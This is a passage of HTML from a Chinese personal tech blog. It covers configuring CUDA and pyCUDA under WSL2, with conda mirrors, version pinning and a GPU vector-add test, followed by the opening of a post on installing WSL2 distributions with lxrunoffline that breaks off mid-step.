<h2 id="6-3-conda-换源"><a href="#6-3-conda-换源" class="headerlink" title="6.3 conda 换源"></a>6.3 conda 换源</h2><p>和前面一样的原因，我们还是换个源。输入下面的命令打开文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.condarc</span><br></pre></td></tr></table></figure>
<p>输入下面的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">channels:</span><br><span class="line">  - https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class="line">  - https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class="line">  - https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class="line">  - https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;pytorch&#x2F;</span><br><span class="line">ssl_verify: true</span><br></pre></td></tr></table></figure>
<br>

<h2 id="6-4-安装-pyCUDA"><a href="#6-4-安装-pyCUDA" class="headerlink" title="6.4 安装 pyCUDA"></a>6.4 安装 pyCUDA</h2><h3 id="6-4-1-尝试安装"><a href="#6-4-1-尝试安装" class="headerlink" title="6.4.1 尝试安装"></a>6.4.1 尝试安装</h3><p>然后我们安装 <code>pycuda</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycuda</span><br></pre></td></tr></table></figure>
<p>然后还是报错了。。。。。报错信息是 <code>g++</code> 怎么怎么，这里不想列举了，太多了。</p>
<h3 id="6-4-3-apt-安装"><a href="#6-4-3-apt-安装" class="headerlink" title="6.4.3 apt 安装"></a>6.4.3 apt 安装</h3><p>在上述失败后，查阅到另一种方法，试试吧。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pycuda</span><br></pre></td></tr></table></figure>
<p>装了好多好大的文件。提示成功了。</p>
<p>但是在终端中（非虚拟环境） 输入 python3 还是无法 <code>import pycuda</code></p>
<p>虚拟环境中也是一样。</p>
<h3 id="6-4-4-返璞归真"><a href="#6-4-4-返璞归真" class="headerlink" title="6.4.4 返璞归真"></a>6.4.4 返璞归真</h3><p>然后又在虚拟环境中，尝试安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycuda</span><br></pre></td></tr></table></figure>
<p>这次没有报错，但是直接报错找不到这个 <code>pycuda</code>。</p>
<p>查阅了资料，或许是应该笔者安装的 <code>CUDA10.2</code> 所以最新的 <code>pycuda2020</code> 不兼容。</p>
<p>于是，更换了安装命令，就安装成功了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycuda&#x3D;&#x3D;2019.1.2</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229174146584.png" alt="安装 pycuda2019"></p>
<br>

<h2 id="6-5-测试-pycuda"><a href="#6-5-测试-pycuda" class="headerlink" title="6.5 测试 pycuda"></a>6.5 测试 pycuda</h2><h3 id="6-5-1-导入-autoinit-测试"><a href="#6-5-1-导入-autoinit-测试" class="headerlink" title="6.5.1 导入 autoinit 测试"></a>6.5.1 导入 autoinit 测试</h3><p>然后我们进入虚拟环境中进行 python 测试一波。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># conda activate py36CUDA </span><br><span class="line"># python</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; from pycuda import autoinit</span><br></pre></td></tr></table></figure>
<p>但是报错无 <code>six</code>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229174307861.png" alt="test-pycuda1"></p>
<p>那就装一个 <code>six</code> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install six</span><br></pre></td></tr></table></figure>
<p>完事之后就成了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229174430625.png" alt="image-20201229174430625"></p>
<p><strong>初战告捷，准备开冲。</strong></p>
<h3 id="6-5-2-实战测试"><a href="#6-5-2-实战测试" class="headerlink" title="6.5.2 实战测试"></a>6.5.2 实战测试</h3><p>新建一个 a+b copy 进去，计算加法。</p>
<h4 id="6-5-2-1-建立源码"><a href="#6-5-2-1-建立源码" class="headerlink" title="6.5.2.1 建立源码"></a>6.5.2.1 建立源码</h4><p>建立 <code>a+b.py</code> 。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pycuda.autoinit</span><br><span class="line"><span class="keyword">import</span> pycuda.driver <span class="keyword">as</span> drv</span><br><span class="line"><span class="keyword">from</span> pycuda.compiler <span class="keyword">import</span> SourceModule</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;a+b.cu&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	cuf = f.read()</span><br><span class="line">mod = SourceModule(cuf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取kernal函数</span></span><br><span class="line">add_func = mod.get_function(<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入 numpy</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 a, b, c</span></span><br><span class="line">a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>], dtype = np.int32)</span><br><span class="line">b = np.array([<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">32</span>], dtype = np.int32)</span><br><span class="line">c = np.full((<span class="number">10</span>, ), <span class="number">0</span>).astype(np.int32)</span><br><span class="line">n = np.int32(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = a+b</span></span><br><span class="line">add_func(drv.In(a), drv.In(b), drv.InOut(c), drv.In(n), block=(<span class="number">32</span>,<span class="number">1</span>,<span class="number">1</span>), grid=(<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
<p>建立 <code>a+b.cu</code> </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__global__ <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b, <span class="keyword">int</span> *c, <span class="keyword">int</span> *n)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tid = threadIdx.x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(tid &lt; (*n))&#123;</span><br><span class="line">        c[tid] = a[tid] + b[tid];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="6-5-2-2-copy-到-WSL-中"><a href="#6-5-2-2-copy-到-WSL-中" class="headerlink" title="6.5.2.2 copy 到 WSL 中"></a>6.5.2.2 copy 到 WSL 中</h4><p>笔者这里建立了一个 <code>test</code> 目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp a+b.* &#x2F;home&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229174644503.png" alt="copy文件"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229174712792.png" alt="查看copy"></p>
<h4 id="6-5-2-3-运行"><a href="#6-5-2-3-运行" class="headerlink" title="6.5.2.3 运行"></a>6.5.2.3 运行</h4><p>完事之后，直接开冲。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 a+b.py </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229174742269.png" alt="运行结果"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>], dtype = np.int32)</span><br><span class="line">b = np.array([<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">32</span>], dtype = np.int32)</span><br><span class="line"></span><br><span class="line">(c = a + b)</span><br><span class="line">c == [ <span class="number">3</span>  <span class="number">5</span>  <span class="number">8</span> <span class="number">10</span> <span class="number">12</span>  <span class="number">7</span>  <span class="number">9</span> <span class="number">13</span> <span class="number">10</span> <span class="number">42</span>]</span><br></pre></td></tr></table></figure>
<p>显然是对了的。</p>
<br>

<h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>本次安装历时两天，因为某些必要的原因恢复了物理机的系统，导致机器的环境都无了。</p>
<p>当再次在 Windows 物理机上配置 <code>pycuda</code> 的环境时，按照以前的教程，花费了一天却一直没有成功，查查查就放弃了。</p>
<p>偶然发现了 <code>WSL</code> 还有了 2，并且还支持 <code>CUDA</code> 了，那这必然也能支持 <code>pycuda</code> 了。于是我又花了另外一天来搭建这个环境。</p>
<blockquote>
<p>对了，还有5天就期末考试的第一门了，我还没复习。GG。</p>
</blockquote>
<br>

<h1 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h1><p>wsl + cuda: <a target="_blank" rel="noopener" href="https://blog.csdn.net/Raink_LH/article/details/107220941">https://blog.csdn.net/Raink_LH/article/details/107220941</a></p>
<p>wsl+cuda 官方教程: <a target="_blank" rel="noopener" href="https://docs.nvidia.com/cuda/wsl-user-guide/index.html#installing-nvidia-drivers">https://docs.nvidia.com/cuda/wsl-user-guide/index.html#installing-nvidia-drivers</a></p>
<p>wsl+cuda+（anaconde）python 官方教程:  <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/direct3d12/gpu-tensorflow-wsl">https://docs.microsoft.com/en-us/windows/win32/direct3d12/gpu-tensorflow-wsl</a></p>
<p>cuda demo测试:  <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000022422496">https://segmentfault.com/a/1190000022422496</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/12/29/WSL+CUDA/" data-id="ckja3vkq8000x14ln9izq7jkj" data-title="Windows 下利用 WSL2 配置 CUDA和pyCUDA" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CUDA/" rel="tag">CUDA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WSL/" rel="tag">WSL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pycuda/" rel="tag">pycuda</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%85%8D%E7%BD%AE/" rel="tag">配置</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-WSL2安装" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/28/WSL2%E5%AE%89%E8%A3%85/" class="article-date">
  <time class="dt-published" datetime="2020-12-28T10:33:52.000Z" itemprop="datePublished">2020-12-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/28/WSL2%E5%AE%89%E8%A3%85/">Windows 使用 lxrunoffline 安装 WSL、WSL2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>笔者认为似乎应该在前面写点什么，但是又不知道写点什么，于是就写了这段话。或许笔者正在思考怎么写这段话。</p>
<p>关于 <code>WSL</code> 有什么好，或者有什么比较方便的地方，这里不多赘述。</p>
<p><strong>多图预警。</strong></p>
<br>

<h1 id="0x02-官方教程配置环境"><a href="#0x02-官方教程配置环境" class="headerlink" title="0x02 官方教程配置环境"></a>0x02 官方教程配置环境</h1><h2 id="2-1-加入体验计划"><a href="#2-1-加入体验计划" class="headerlink" title="2.1 加入体验计划"></a>2.1 加入体验计划</h2><p>首先进入 <code>设置</code> → <code>更新和安全</code> → <code>Windows预览体验计划</code> 然后选择开始，加入此计划。然后选择 <code>Dev</code> ，然后一路默认。</p>
<blockquote>
<p>如果点进来是一片空白，根据<a target="_blank" rel="noopener" href="https://answers.microsoft.com/zh-hans/insider/forum/insider_wintp-insider_install/windows%E9%A2%84%E8%A7%88%E4%BD%93%E9%AA%8C/14d3002b-03ac-459e-b518-34231b1727e0?auth=1">官方</a>提示，需要修改一个地方：</p>
<p>在设置中搜索 <code>诊断数据</code>，打开 <code>诊断和数据</code>，修改为 <code>可选诊断数据</code> 即可出现上述的界面，而不是白的了。可参考。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228193934870.png" alt="Windows预览体验计划"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228193955261.png" alt="Windows预览体验计划2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228194013308.png" alt="Windows预览体验计划3"></p>
<br>

<h3 id="2-1-2-更新系统版本"><a href="#2-1-2-更新系统版本" class="headerlink" title="2.1.2 更新系统版本"></a>2.1.2 更新系统版本</h3><p>重启之后，进入设置中的 <code>Windows 更新</code>，在下图所示的 <code>高级选项</code> 中选择 <code>更新 Windows 时接受其他 Microsoft 产品更新</code>。</p>
<p>然后返回更新页面，开始进行更新，这个过程可能会反复很多次，耗时也比较久。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228194919061.png" alt="高级选项"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228194824800.png" alt="检测到更新"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228195057696.png" alt="开始下载更新"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228203158530.png" alt="等待重启更新"></p>
<br>

<h3 id="2-1-3-检查系统版本"><a href="#2-1-3-检查系统版本" class="headerlink" title="2.1.3 检查系统版本"></a>2.1.3 检查系统版本</h3><p>更新完毕后，需要检查当前的系统版本是否满足要求了。 按住 <code>win</code> + <code>R</code> 输入命令：<code>winver</code> ，即可以查看下图的信息。</p>
<p>WSL要求系统版本 2004 以上，微软官方说 OS 内部版本为 19041 以上。</p>
<p>而想要安装 CUDA，则要求系统不仅仅是版本 2004， 并且 OS 内部版本必须为 20145 之后。</p>
<p><strong>所以，读者根据自己的需求自行决定。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229140249702.png" alt="系统信息"></p>
<br>

<h3 id="2-1-4-打开-WSL-选项"><a href="#2-1-4-打开-WSL-选项" class="headerlink" title="2.1.4 打开 WSL 选项"></a>2.1.4 打开 WSL 选项</h3><h4 id="2-1-4-1-命令行打开-WSL"><a href="#2-1-4-1-命令行打开-WSL" class="headerlink" title="2.1.4.1 命令行打开 WSL"></a>2.1.4.1 命令行打开 WSL</h4><p>以管理员权限运行 <code>PowerShell</code> 并输入下面的命令，若提示是否要重启，则选择暂时不重启。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br><span class="line"></span><br><span class="line">dism.exe &#x2F;online &#x2F;enable-feature &#x2F;featurename:Microsoft-Windows-Subsystem-Linux &#x2F;all &#x2F;norestart</span><br></pre></td></tr></table></figure>
<p>两个命令都运行完毕后，手动重启。</p>
<h4 id="2-1-4-2-检查启动是否成功"><a href="#2-1-4-2-检查启动是否成功" class="headerlink" title="2.1.4.2 检查启动是否成功"></a>2.1.4.2 检查启动是否成功</h4><p>重启之后，在 <code>控制面板</code> → <code>程序</code> → <code>启动或关闭Windows功能</code> 检查是否开启了 <code>适用于Linux的Windows子系统</code>。（有可能是英文</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228210417296.png" alt="检查WSL启动成功"></p>
<p>确认开启无误后，在管理员 <code>PowerShell</code> 中运行下面命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe &#x2F;online &#x2F;enable-feature &#x2F;featurename:VirtualMachinePlatform &#x2F;all &#x2F;norestart</span><br></pre></td></tr></table></figure>
<p>然后重启。</p>
<br>

<h3 id="2-1-5-下载-msi-安装包"><a href="#2-1-5-下载-msi-安装包" class="headerlink" title="2.1.5 下载 msi 安装包"></a>2.1.5 下载 msi 安装包</h3><p>从官方下载对应的安装包文件，然后直接一瞬安装。唯一需要注意的就是自己系统的版本和CPU架构。</p>
<p>msi 安装包地址：<a target="_blank" rel="noopener" href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">download</a>。</p>
<p>然后双击运行</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228211448330.png" alt="进行安装"></p>
<p>一路默认就好</p>
<br>

<h3 id="2-1-6-设置默认-WSL2"><a href="#2-1-6-设置默认-WSL2" class="headerlink" title="2.1.6 设置默认 WSL2"></a>2.1.6 设置默认 WSL2</h3><p>然后在管理员 <code>PowerShell</code> 中通过如下命令设置默认版本为 <code>WSL2</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>
<br>

<h2 id="2-2-lxrunoffline-工具安装"><a href="#2-2-lxrunoffline-工具安装" class="headerlink" title="2.2 lxrunoffline  工具安装"></a>2.2 lxrunoffline  工具安装</h2><p>下面将使用工具 <code>lxrunoffline </code> 进行后续的安装，若读者只想从官方一样用微软商店进行安装的话，移步<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/install-win10#step-5---set-wsl-2-as-your-default-version">官方教程</a>，后面就比较简单。 </p>
<h3 id="2-2-1-lxrunoffline-简介"><a href="#2-2-1-lxrunoffline-简介" class="headerlink" title="2.2.1 lxrunoffline  简介"></a>2.2.1 lxrunoffline  简介</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/DDoSolitary/LxRunOffline">lxrunoffline</a> 工具是一个 GitHub 上开发的很好用的管理工具，使用这个工具具有众多好处：</p>
<p>可以安装任意发行版到任意目录、转移已安装的 WSL 目录、备份 WSL、设置默认用户和修改环境变量等操作，完全碾压 WSL、wslconfig 这些简陋原生管理命令。</p>
</blockquote>
<br>

<h3 id="2-2-2-lxrunoffline-的安装"><a href="#2-2-2-lxrunoffline-的安装" class="headerlink" title="2.2.2 lxrunoffline 的安装"></a>2.2.2 lxrunoffline 的安装</h3><p>虽然 <code>lxrunoffline</code> 从笔者看的博文来看拥有多重安装方式，但是个人觉得其他的方式需要额外配置很多环境或者工具。不如直接手动安装来得好和轻便。</p>
<blockquote>
<p>  其他方式有如 使用 Chocolatey 安装， 使用 Scoop 安装。这部分读者有兴趣可以参阅这个<a target="_blank" rel="noopener" href="https://p3terx.com/archives/manage-wsl-with-lxrunoffline.html">博文</a>。</p>
</blockquote>
<h4 id="2-2-2-1-下载-lxrunoffline"><a href="#2-2-2-1-下载-lxrunoffline" class="headerlink" title="2.2.2.1 下载 lxrunoffline"></a>2.2.2.1 下载 lxrunoffline</h4><p>首先是下载 <code>lxrunoffline</code>，<a target="_blank" rel="noopener" href="https://github.com/DDoSolitary/LxRunOffline/releases">地址</a>。</p>
<p>然后选择合适的版本，我也不知道区别，只是我认识 mingw 所以就选择了这个。下载解压之后里面有个 <code>LxRunOffline.exe</code>，然后将 <code>LxRunOffline.exe</code> 放到某一个你觉得合适的地方，然后为了方便，建议添加环境变量。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228232704365.png" alt="下载lxrunoffline"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229144215709.png" alt="添加lxrunoffline到环境变量"></p>
<p>然后就可以愉快在命令行中使用这个命令了 <code>lxrunoffline</code> 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229144254301.png" alt="lxrunoffline 命令"></p>
<p>至此 <code>lxrunoffline </code> 安装完毕。</p>
<h4 id="2-2-2-2-lxrunoffline-命令介绍"><a href="#2-2-2-2-lxrunoffline-命令介绍" class="headerlink" title="2.2.2.2 lxrunoffline 命令介绍"></a>2.2.2.2 lxrunoffline 命令介绍</h4><p>细心的读者已经发现上图中已经显示了一种查看help的方式，直接缺省就会打印help信息，这里简要列举了部分。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">l , list - 列出所有已安装的发行版。</span><br><span class="line">gd , get-default - 获取 bash.exe 使用的默认发行版。</span><br><span class="line">sd , set-default - 设置 bash.exe 使用的默认发行版。</span><br><span class="line">i , install - 安装新的发行版。</span><br><span class="line">sd , set-default - 设置 bash.exe 使用的默认发行版。</span><br><span class="line">ui , uninstall - 卸载发行版。</span><br><span class="line">rg , register - 注册现有的安装目录。</span><br><span class="line">ur , unregister - 取消注册发行版但不删除安装目录。</span><br><span class="line">m , move - 将发行版移动到新目录。</span><br><span class="line">d , duplicate - 在新目录中复制现有发行版。</span><br><span class="line">e , export - 将发行版的文件系统导出到.tar.gz 文件，该文件可以通过 install 命令安装。</span><br><span class="line">r , run - 在发行版中运行命令。</span><br><span class="line">di , get-dir - 获取发行版的安装目录。</span><br><span class="line">gv , get-version - 获取发行版的文件系统版本。</span><br><span class="line">ge , get-env - 获取发行版的默认环境变量。</span><br><span class="line">se , set-env - 设置发行版的默认环境变量。</span><br><span class="line">ae , add-env - 添加到发行版的默认环境变量。</span><br><span class="line">re , remove-env - 从发行版的默认环境变量中删除。</span><br><span class="line">gu , get-uid - 获取发行版的默认用户的 UID。</span><br><span class="line">su , set-uid - 设置发行版的默认用户的 UID。</span><br><span class="line">gk , get-kernelcmd - 获取发行版的默认内核命令行。</span><br><span class="line">sk , set-kernelcmd - 设置发行版的默认内核命令行。</span><br><span class="line">gf , get-flags - 获取发行版的一些标志。有关详细信息，请参考这里。</span><br><span class="line">sf , set-flags - 设置发行版的一些标志。有关详细信息，请参考这里。</span><br><span class="line">s , shortcut - 创建启动发行版的快捷方式。</span><br><span class="line">ec , export-config - 将发行版配置导出到 XML 文件。</span><br><span class="line">ic , import-config - 从 XML 文件导入发行版的配置。</span><br><span class="line">sm , summary - 获取发行版的一般信息。</span><br></pre></td></tr></table></figure>
<p>更多使用功能和常用功能请参阅<a target="_blank" rel="noopener" href="https://p3terx.com/archives/manage-wsl-with-lxrunoffline.html">这里</a>。</p>
<br>

<h2 id="2-3-发行版的安装"><a href="#2-3-发行版的安装" class="headerlink" title="2.3  发行版的安装"></a>2.3  发行版的安装</h2><h3 id="2-3-1-distros-下载"><a href="#2-3-1-distros-下载" class="headerlink" title="2.3.1 distros 下载"></a>2.3.1 distros 下载</h3><p>使用此工具可以按照任意版本的有效的 WSL 发行版本。这里我选择了 <code>Ubuntu18.04</code> ，本来选择 <code>kali</code> 的，但是 <code>kali </code> 安装失败了。于是还是就使用 <code>Ubuntu</code> 了。</p>
<p>官方发行版文件列表在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/install-manual#installing-your-distro">这里</a>。点击选择一个合适的版本，这里笔者选择了 <code>Ubuntu18.04</code> 。<code>ARM</code> 架构的朋友自己选择对应的版本。</p>
<p><img src="C:\Users\chegn\AppData\Roaming\Typora\typora-user-images\image-20201228234022577.png" alt="下载列表"></p>
<br>

<h3 id="2-3-2-解压安装"><a href="#2-3-2-解压安装" class="headerlink" title="2.3.2 解压安装"></a>2.3.2 解压安装</h3><p>下载的压缩包解压之后里面有一个 <code>install.tar.gz</code> ，然后就可以安装了。</p>
<blockquote>
<p>为了避免不必要的麻烦，以下都是管理员权限在运行命令</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229145235756.png" alt="压缩包内容"></p>
<p>先在你想存储此 <code>WSL</code> 的地方建立合适的文件夹。因为笔者有多个不同版本的 <code>WSL</code> ，为了方便在E盘下建立了一个目录 <code>WSL</code>，然后建立了一个文件夹 <code>Ubuntu18CUDA</code> 用于存储此 <code>Ubuntu18.04</code> 的发行版。</p>
<p>上述准备完毕后，然后在 <code>PowerShell</code> 中运行下面的命令，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># lxrunoffline i -n &lt;WSL名称&gt; -d &lt;安装路径&gt; -f &lt;安装包路径&gt;install.tar.gz</span><br><span class="line"></span><br><span class="line">lxrunoffline i -n &quot;Ubuntu18CUDA&quot; -d &quot;G:\WSL\Ubuntu18CUDA&quot; -f &quot;C:\Users\chegn\Downloads\Compressed\Ubuntu_1804.2019.522.0_x64\install.tar.gz&quot;</span><br></pre></td></tr></table></figure>
<p>如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/LCX666/picgo-blog/master/img/image-20201228215355213.png" alt="安装发行版"></p>
<br>

<h3 id="2-3-3-设置用户"><a href="#2-3-3-设置用户" class="headerlink" title="2.3.3 设置用户"></a>2.3.3 设置用户</h3><p>为了方便我们需要设置用户，笔者个人比较喜欢随时都是 <code>root</code>，但是这个不怎安全。</p>
<h4 id="2-3-3-1-设置-root-为默认用户"><a href="#2-3-3-1-设置-root-为默认用户" class="headerlink" title="2.3.3.1 设置 root 为默认用户"></a>2.3.3.1 设置 root 为默认用户</h4><p><code>root</code>  用户的 <code>UID</code> 为 <code>0</code>，所以可以直接在 <code>Pow­er­Shell</code> 输入以下命令进行设置：</p>
